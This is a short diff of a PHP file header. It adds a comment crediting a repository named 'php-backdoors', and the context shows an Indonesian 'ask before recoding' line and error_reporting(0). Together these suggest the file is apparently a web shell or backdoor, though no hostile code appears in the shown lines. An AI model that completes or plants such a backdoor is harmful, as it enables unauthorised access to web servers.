@@ -1,5 +1,5 @@
 <?php
-
+// from https://github.com/1337r0j4n/php-backdoors
 // RECODE? IZIN DULU TOD
 
 error_reporting(0);
